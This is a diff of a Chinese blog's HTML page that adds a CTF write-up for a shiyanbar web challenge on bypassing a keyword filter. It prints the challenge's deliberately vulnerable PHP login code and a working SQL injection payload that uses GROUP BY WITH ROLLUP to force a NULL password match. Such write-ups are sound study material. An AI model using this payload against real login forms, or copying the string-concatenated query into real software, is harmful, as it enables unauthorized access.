@@ -89,7 +89,8 @@
 <meta property="og:image" content="https://isky0t.github.io/images/shiyanbar01sql.png">
 <meta property="og:image" content="https://isky0t.github.io/images/shiyanbar02user.png">
 <meta property="og:image" content="https://isky0t.github.io/images/shiyanbar03flag.png">
-<meta property="og:updated_time" content="2017-10-03T01:38:39.000Z">
+<meta property="og:image" content="https://isky0t.github.io/images/shiyanbar04group.png">
+<meta property="og:updated_time" content="2017-10-03T11:35:54.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="shiyanbar-writeup">
 <meta name="twitter:description" content="最近想参加CTF的比赛，于是国庆放假做一下实验吧的web部分题目 并简单做个记录，并非完全是自己的writeup吧 和别人共同讨论吧！">
@@ -330,8 +331,6 @@
           
 
           
-            
-          
 
           
           
@@ -404,6 +403,13 @@
 </li>
 </ol>
 <p><img src="/images/shiyanbar03flag.png" alt="flag"></p>
+<h2 id="因缺思汀的绕过"><a href="#因缺思汀的绕过" class="headerlink" title="因缺思汀的绕过"></a>因缺思汀的绕过</h2><blockquote>
+<p>访问解题链接去访问题目,可以进行答题。根据web题一般解题思路去解答此题。看源码，请求，响应等。提交与题目要求一致的内容即可返回flag。然后提交正确的flag即可得分。web题主要考察SQL注入，XSS等相关知识。涉及方向较多。此题主要涉及源码审计，MySQL相关的知识。</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'uname'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'pwd'</span>])) &#123;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;form action="" method="post"&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;input name="uname" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;input name="pwd" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;input type="submit" /&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;/form&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	<span class="keyword">echo</span> <span class="string">'&lt;!--source: source.txt--&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</div><div class="line">    <span class="keyword">die</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">AttackFilter</span><span class="params">($StrKey,$StrValue,$ArrReq)</span></span>&#123;  </div><div class="line">    <span class="keyword">if</span> (is_array($StrValue))&#123;</div><div class="line">        $StrValue=implode($StrValue);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$ArrReq.<span class="string">"/is"</span>,$StrValue)==<span class="number">1</span>)&#123;   </div><div class="line">        <span class="keyword">print</span> <span class="string">"水可载舟，亦可赛艇！"</span>;</div><div class="line">        <span class="keyword">exit</span>();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$filter = <span class="string">"and|select|from|where|union|join|sleep|benchmark|,|\(|\)"</span>;</div><div class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key=&gt;$value)&#123; </div><div class="line">    AttackFilter($key,$value,$filter);</div><div class="line">&#125;</div><div class="line"></div><div class="line">$con = mysql_connect(<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>);</div><div class="line"><span class="keyword">if</span> (!$con)&#123;</div><div class="line">	<span class="keyword">die</span>(<span class="string">'Could not connect: '</span> . mysql_error());</div><div class="line">&#125;</div><div class="line">$db=<span class="string">"XXXXXX"</span>;</div><div class="line">mysql_select_db($db, $con);</div><div class="line">$sql=<span class="string">"SELECT * FROM interest WHERE uname = '&#123;$_POST['uname']&#125;'"</span>;</div><div class="line">$query = mysql_query($sql); </div><div class="line"><span class="keyword">if</span> (mysql_num_rows($query) == <span class="number">1</span>) &#123; </div><div class="line">    $key = mysql_fetch_array($query);</div><div class="line">    <span class="keyword">if</span>($key[<span class="string">'pwd'</span>] == $_POST[<span class="string">'pwd'</span>]) &#123;</div><div class="line">        <span class="keyword">print</span> <span class="string">"CTF&#123;XXXXXX&#125;"</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">print</span> <span class="string">"亦可赛艇！"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">	<span class="keyword">print</span> <span class="string">"一颗赛艇！"</span>;</div><div class="line">&#125;</div><div class="line">mysql_close($con);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>简单说明：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">preg_match(string $pattern , string $subject)</div><div class="line">匹配字符串 /i不区分大小写 返回值有int(0)未匹配到 int(1)匹配到 和false匹配错误</div></pre></td></tr></table></figure></p>
+<p>大致思路：首先看过滤的关键字，那就没办法用<code>union</code>联合查询一个可控的pwd。那就把希望寄托于将<code>$key[&#39;pwd&#39;]==$_POST[&#39;pwd&#39;]</code> 构造成<code>null=null</code>的等式 ，查询资料后得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">group by with rollup </div><div class="line">对某个字段汇总（聚合）新增的一条记录字段本身内容为NULL</div></pre></td></tr></table></figure></p>
+<p><img src="/images/shiyanbar04group.png" alt="group by with rollup"><br>构造提交payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">uname=&apos; or 1=1 group by pwd with rollup limit 1 offset 2 #&amp;pwd=</div></pre></td></tr></table></figure></p>
 
       
     </div>
@@ -477,12 +483,6 @@
 
 
           
-  <div class="comments" id="comments">
-    
-      <div id="lv-container" data-id="city" data-uid="MTAyMC8zMTE0My83Njky"></div>
-    
-  </div>
-
 
         </div>
         
@@ -609,7 +609,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#登陆一下好吗"><span class="nav-number">1.</span> <span class="nav-text">登陆一下好吗??</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#who-are-you"><span class="nav-number">2.</span> <span class="nav-text">who are you?</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#不使用逗号"><span class="nav-number">2.1.</span> <span class="nav-text">不使用逗号</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#登陆一下好吗"><span class="nav-number">1.</span> <span class="nav-text">登陆一下好吗??</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#who-are-you"><span class="nav-number">2.</span> <span class="nav-text">who are you?</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#不使用逗号"><span class="nav-number">2.1.</span> <span class="nav-text">不使用逗号</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#因缺思汀的绕过"><span class="nav-number">3.</span> <span class="nav-text">因缺思汀的绕过</span></a></li></ol></div>
             
 
           </div>
@@ -780,17 +780,6 @@
 
 
 
-  
-    <script type="text/javascript">
-      (function(d, s) {
-        var j, e = d.getElementsByTagName(s)[0];
-        if (typeof LivereTower === 'function') { return; }
-        j = d.createElement(s);
-        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
-        j.async = true;
-        e.parentNode.insertBefore(j, e);
-      })(document, 'script');
-    </script>
   
 
 
